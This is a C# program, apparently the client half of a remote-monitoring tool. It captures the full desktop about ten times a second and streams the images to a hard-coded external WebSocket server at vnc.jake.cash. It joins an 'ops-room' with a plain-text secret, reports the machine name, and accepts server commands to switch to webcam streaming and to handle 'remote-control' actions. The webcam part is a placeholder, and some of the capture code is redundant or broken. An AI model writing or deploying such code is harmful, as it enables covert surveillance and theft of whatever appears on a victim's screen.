using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace WebcamSender
{
    public class WebcamCapture
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hwnd);
        
        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        
        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        
        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        
        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        
        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        
        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);
        
        private const uint SRCCOPY = 0x00CC0020;
        
        public static byte[] CaptureDesktop()
        {
            IntPtr hdcSrc = GetWindowDC(GetDesktopWindow());
            IntPtr hdcDest = CreateCompatibleDC(hdcSrc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdcSrc, 1920, 1080);
            IntPtr hOld = SelectObject(hdcDest, hBitmap);
            
            BitBlt(hdcDest, 0, 0, 1920, 1080, hdcSrc, 0, 0, SRCCOPY);
            
            SelectObject(hdcDest, hOld);
            DeleteObject(hBitmap);
            DeleteObject(hdcDest);
            ReleaseDC(GetDesktopWindow(), hdcSrc);
            
            // For actual implementation, you'd need to convert the bitmap to bytes
            // This is a simplified version
            using (var bmp = new Bitmap(1920, 1080))
            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
        }
        
        public static byte[] CaptureWebcam()
        {
            // This is a placeholder for actual webcam capture
            // You would need to use libraries like AForge.NET or DirectShow
            // For now, return a dummy image
            using (var bmp = new Bitmap(640, 480))
            using (var g = Graphics.FromImage(bmp))
            {
                g.Clear(Color.Blue);
                g.DrawString("WEBCAM", new Font("Arial", 20), Brushes.White, 200, 200);
                
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
        }
    }

    public class WebcamSender
    {
        private ClientWebSocket _ws;
        private bool _isWebcamActive = false;
        private readonly string _serverUrl = "ws://vnc.jake.cash:3000";
        private readonly string _roomId = "ops-room";
        private readonly string _secret = "boi123";
        private readonly string _machineId = Environment.MachineName;
        
        public async Task StartAsync()
        {
            _ws = new ClientWebSocket();
            
            // Connect to server
            await _ws.ConnectAsync(new Uri(_serverUrl), CancellationToken.None);
            Console.WriteLine("Connected to server");
            
            // Join room as sender
            var joinMsg = new
            {
                type = "join",
                role = "sender",
                roomId = _roomId,
                secret = _secret,
                machineId = _machineId
            };
            
            await SendJsonAsync(joinMsg);
            Console.WriteLine("Joined room as sender");
            
            // Start streaming loop
            await StreamingLoop();
        }
        
        private async Task StreamingLoop()
        {
            while (_ws.State == WebSocketState.Open)
            {
                try
                {
                    byte[] imageData = _isWebcamActive ? 
                        WebcamCapture.CaptureWebcam() : 
                        WebcamCapture.CaptureDesktop();
                    
                    await _ws.SendAsync(new ArraySegment<byte>(imageData), 
                        WebSocketMessageType.Binary, true, CancellationToken.None);
                    
                    await Task.Delay(100); // ~10 FPS
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error sending frame: {ex.Message}");
                    break;
                }
            }
        }
        
        private async Task SendJsonAsync(object obj)
        {
            var json = JsonConvert.SerializeObject(obj);
            var buffer = Encoding.UTF8.GetBytes(json);
            await _ws.SendAsync(new ArraySegment<byte>(buffer), 
                WebSocketMessageType.Text, true, CancellationToken.None);
        }
        
        private async Task HandleMessages()
        {
            var buffer = new byte[4096];
            while (_ws.State == WebSocketState.Open)
            {
                try
                {
                    var result = await _ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    
                    if (result.MessageType == WebSocketMessageType.Text)
                    {
                        var message = Encoding.UTF8.GetString(buffer, 0, result.Count);
                        var msg = JsonConvert.DeserializeObject<dynamic>(message);
                        
                        await HandleMessage(msg);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error receiving message: {ex.Message}");
                    break;
                }
            }
        }
        
        private async Task HandleMessage(dynamic msg)
        {
            string type = msg.type;
            
            switch (type)
            {
                case "start-webcam":
                    _isWebcamActive = true;
                    Console.WriteLine("Webcam streaming started");
                    
                    // Send confirmation back to server
                    await SendJsonAsync(new { type = "start-webcam", machineId = _machineId });
                    break;
                    
                case "stop-webcam":
                    _isWebcamActive = false;
                    Console.WriteLine("Webcam streaming stopped, back to desktop");
                    
                    // Send confirmation back to server
                    await SendJsonAsync(new { type = "stop-webcam", machineId = _machineId });
                    break;
                    
                case "remote-control":
                    // Handle remote control commands here
                    Console.WriteLine($"Remote control: {msg.action}");
                    break;
            }
        }
        
        public static async Task Main(string[] args)
        {
            var sender = new WebcamSender();
            
            // Start message handling in background
            _ = Task.Run(() => sender.HandleMessages());
            
            // Start streaming
            await sender.StartAsync();
        }
    }
}
